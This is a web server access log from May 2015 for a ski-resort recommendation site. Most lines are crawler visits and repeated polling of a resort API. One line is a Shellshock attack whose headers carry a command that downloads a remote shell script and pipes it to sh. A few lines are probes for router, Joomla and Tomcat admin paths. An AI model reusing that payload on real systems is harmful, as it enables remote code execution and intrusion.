66.249.65.131 - - [04/May/2015:14:11:16 -0700] "GET /resorts?resort=bridgerbowl&date=2013-06-14 HTTP/1.1" 404 509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.94 - - [04/May/2015:14:15:01 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
123.125.71.85 - - [04/May/2015:14:15:50 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
170.75.162.130 - - [04/May/2015:14:18:52 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1028 "-" "node-superagent/0.18.2"
220.181.108.184 - - [04/May/2015:14:20:31 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:14:25:32 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 965 "-" "node-superagent/0.18.2"
207.166.7.211 - - [04/May/2015:14:30:06 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
46.151.212.26 - - [04/May/2015:14:30:38 -0700] "GET / HTTP/1.0" 408 541 "() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh" "() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh"
170.75.162.130 - - [04/May/2015:14:37:33 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1045 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:40:53 -0700] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 1048 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:46:14 -0700] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 1009 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:46:44 -0700] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 913 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:46:44 -0700] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 916 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:46:44 -0700] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 900 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:46:44 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 928 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:14:51:24 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 950 "-" "node-superagent/0.18.2"
66.214.222.203 - - [04/May/2015:14:55:22 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
75.101.109.157 - - [04/May/2015:15:11:01 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"
100.43.90.10 - - [04/May/2015:15:11:06 -0700] "GET /robots.txt HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
134.197.86.167 - - [04/May/2015:15:13:23 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0 Iceweasel/35.0.1"
170.75.162.130 - - [04/May/2015:15:17:37 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1043 "-" "node-superagent/0.18.2"
153.24.73.60 - - [04/May/2015:15:23:31 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
100.43.90.10 - - [04/May/2015:15:30:38 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
204.120.62.127 - - [04/May/2015:15:34:51 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
170.75.162.130 - - [04/May/2015:15:42:59 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 970 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:42:59 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 977 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:42:59 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 989 "-" "node-superagent/0.18.2"
182.118.53.105 - - [04/May/2015:15:45:20 -0700] "GET / HTTP/1.1" 200 2320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
123.125.71.51 - - [04/May/2015:15:50:26 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
123.125.71.55 - - [04/May/2015:15:51:27 -0700] "-" 408 0 "-" "-"
24.180.42.102 - - [04/May/2015:15:51:54 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
24.180.42.102 - - [04/May/2015:15:52:15 -0700] "-" 408 0 "-" "-"
104.131.209.252 - - [04/May/2015:15:54:34 -0700] "HEAD / HTTP/1.1" 200 310 "http://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
220.181.108.92 - - [04/May/2015:15:56:59 -0700] "-" 408 0 "-" "-"
68.180.228.182 - - [04/May/2015:15:58:02 -0700] "GET /robots.txt HTTP/1.1" 304 152 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.228.182 - - [04/May/2015:15:58:02 -0700] "GET /resorts?resort=chinapeak&date=2014-09-28 HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
170.75.162.130 - - [04/May/2015:15:58:50 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1074 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1030 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1027 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1045 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1092 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1044 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1061 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1024 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1070 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1041 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:15:58:51 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1020 "-" "node-superagent/0.18.2"
180.76.4.75 - - [04/May/2015:15:59:08 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
91.204.150.206 - - [04/May/2015:16:10:48 -0700] "GET / HTTP/1.1" 200 6095 "-" "-"
108.233.162.33 - - [04/May/2015:16:14:50 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
194.63.141.166 - - [04/May/2015:16:44:21 -0700] "GET /rom-0 HTTP/1.1" 404 489 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.25 - - [04/May/2015:16:46:56 -0700] "-" 408 0 "-" "-"
104.131.210.105 - - [04/May/2015:16:48:57 -0700] "HEAD / HTTP/1.1" 200 310 "http://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
220.181.108.142 - - [04/May/2015:16:52:20 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
206.107.211.5 - - [04/May/2015:17:05:08 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6052 "http://www.thebackcountry.net/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1055 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1109 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 998 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1066 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1088 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 1044 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 957 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:06:16 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1047 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:06 -0700] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 946 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:06 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 986 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:06 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1022 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:06 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 966 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:16 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 983 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:16 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 954 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:16 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1045 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:16 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1061 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:27 -0700] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1100 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:27 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 958 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:36 -0700] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 1073 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:36 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 986 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:46 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 966 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:56 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1050 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:07:56 -0700] "GET /lib/reccapi.php?resort=canyons HTTP/1.1" 200 1024 "-" "node-superagent/0.18.2"
216.162.180.250 - - [04/May/2015:17:08:09 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0"
170.75.162.130 - - [04/May/2015:17:08:36 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 998 "-" "node-superagent/0.18.2"
166.137.126.80 - - [04/May/2015:17:38:13 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SAMSUNG-SGH-I747 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
66.249.65.2 - - [04/May/2015:17:41:52 -0700] "GET /resorts?resort=parkcity&date=2013-12-10 HTTP/1.1" 404 509 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [04/May/2015:17:50:40 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1056 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:50:41 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1049 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:50:41 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 1043 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:17:51:30 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1038 "-" "node-superagent/0.18.2"
180.76.4.224 - - [04/May/2015:17:52:24 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
123.125.71.20 - - [04/May/2015:17:58:00 -0700] "-" 408 0 "-" "-"
46.119.59.134 - - [04/May/2015:18:02:20 -0700] "GET /administrator/index.php HTTP/1.1" 404 532 "-" "Mozilla/5.0 (Windows NT 5.1; rv:29.0) Gecko/20100101 Firefox/29.0"
220.181.108.166 - - [04/May/2015:18:03:16 -0700] "-" 408 0 "-" "-"
37.187.56.76 - - [04/May/2015:18:24:42 -0700] "GET /robots.txt HTTP/1.0" 200 338 "-" ""
37.187.56.76 - - [04/May/2015:18:24:42 -0700] "GET / HTTP/1.1" 206 6142 "-" "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
37.187.56.76 - - [04/May/2015:18:24:44 -0700] "GET /about HTTP/1.1" 404 476 "-" "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
85.168.103.55 - - [04/May/2015:18:26:07 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18"
54.80.78.133 - - [04/May/2015:18:26:24 -0700] "HEAD / HTTP/1.1" 200 291 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
170.75.162.130 - - [04/May/2015:18:38:44 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 957 "-" "node-superagent/0.18.2"
66.249.65.192 - - [04/May/2015:18:43:25 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
68.46.172.233 - - [04/May/2015:18:46:53 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0"
123.125.71.84 - - [04/May/2015:18:49:06 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
123.125.71.102 - - [04/May/2015:18:50:03 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.181 - - [04/May/2015:18:53:56 -0700] "-" 408 0 "-" "-"
184.189.239.178 - - [04/May/2015:19:28:43 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0"
217.12.206.140 - - [04/May/2015:19:40:33 -0700] "GET / HTTP/1.1" 200 2339 "http://whereshouldiski.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
123.125.71.113 - - [04/May/2015:19:45:25 -0700] "-" 408 0 "-" "-"
66.249.65.135 - - [04/May/2015:19:46:22 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.181.108.159 - - [04/May/2015:19:50:00 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1026 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1074 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1032 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1042 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1091 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1044 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1061 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1025 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1067 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1041 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:19:59:00 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1019 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:20:06:00 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 999 "-" "node-superagent/0.18.2"
180.76.4.152 - - [04/May/2015:20:07:19 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
123.220.251.190 - - [04/May/2015:20:11:30 -0700] "GET /manager/html HTTP/1.1" 404 503 "-" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
24.6.103.245 - - [04/May/2015:20:22:11 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0"
70.176.10.161 - - [04/May/2015:20:23:35 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4"
123.125.71.116 - - [04/May/2015:20:41:13 -0700] "-" 408 0 "-" "-"
220.181.108.99 - - [04/May/2015:20:45:40 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:20:48:44 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 1035 "-" "node-superagent/0.18.2"
66.220.146.21 - - [04/May/2015:20:58:17 -0700] "GET /images/viz-screenshot.png HTTP/1.1" 404 517 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
66.220.146.25 - - [04/May/2015:20:58:18 -0700] "GET /images/viz-screenshot.png HTTP/1.1" 404 517 "-" "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)"
173.252.120.114 - - [04/May/2015:21:00:32 -0700] "GET /images/prop3.png HTTP/1.1" 200 95754 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
98.210.227.229 - - [04/May/2015:21:22:12 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko"
98.210.227.229 - - [04/May/2015:21:22:33 -0700] "-" 408 0 "-" "-"
24.180.42.102 - - [04/May/2015:21:28:58 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
24.180.42.102 - - [04/May/2015:21:29:19 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:21:33:18 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1109 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:21:33:18 -0700] "GET /lib/reccapi.php?resort=canyons HTTP/1.1" 200 1024 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:21:33:18 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1033 "-" "node-superagent/0.18.2"
66.249.65.4 - - [04/May/2015:21:36:59 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [04/May/2015:21:42:08 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 997 "-" "node-superagent/0.18.2"
123.125.71.83 - - [04/May/2015:21:43:02 -0700] "-" 408 0 "-" "-"
220.181.108.172 - - [04/May/2015:21:47:34 -0700] "-" 408 0 "-" "-"
180.76.4.50 - - [04/May/2015:22:02:49 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
68.224.241.73 - - [04/May/2015:22:06:28 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53"
170.75.162.130 - - [04/May/2015:22:14:11 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1046 "-" "node-superagent/0.18.2"
181.61.83.30 - - [04/May/2015:22:22:17 -0700] "GET / HTTP/1.0" 200 2376 "http://whereshouldiski.com" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
170.75.162.130 - - [04/May/2015:22:28:32 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 1028 "-" "node-superagent/0.18.2"
24.5.112.41 - - [04/May/2015:22:28:44 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
24.5.112.41 - - [04/May/2015:22:29:05 -0700] "-" 408 0 "-" "-"
66.249.65.2 - - [04/May/2015:22:30:21 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.5.112.41 - - [04/May/2015:22:31:31 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [04/May/2015:22:37:13 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 998 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:37:33 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 925 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:37:33 -0700] "GET /lib/reccapi.php?resort=grandtarghee HTTP/1.1" 200 1057 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:37:33 -0700] "GET /lib/reccapi.php?resort=jacksonhole HTTP/1.1" 200 1039 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:37:33 -0700] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 1064 "-" "node-superagent/0.18.2"
68.180.228.182 - - [04/May/2015:22:43:56 -0700] "GET /resorts?resort=telluride&date=2014-11-16 HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
170.75.162.130 - - [04/May/2015:22:46:44 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 966 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:50:14 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1009 "-" "node-superagent/0.18.2"
174.34.131.177 - - [04/May/2015:22:53:53 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
104.238.137.55 - - [04/May/2015:22:54:38 -0700] "GET / HTTP/1.0" 200 6114 "-" "-"
170.75.162.130 - - [04/May/2015:22:57:55 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1063 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:55 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1054 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:55 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 1044 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:55 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 959 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:56 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1037 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:56 -0700] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1098 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:56 -0700] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 1073 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:57 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1049 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:57 -0700] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 1043 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:22:57:57 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 964 "-" "node-superagent/0.18.2"
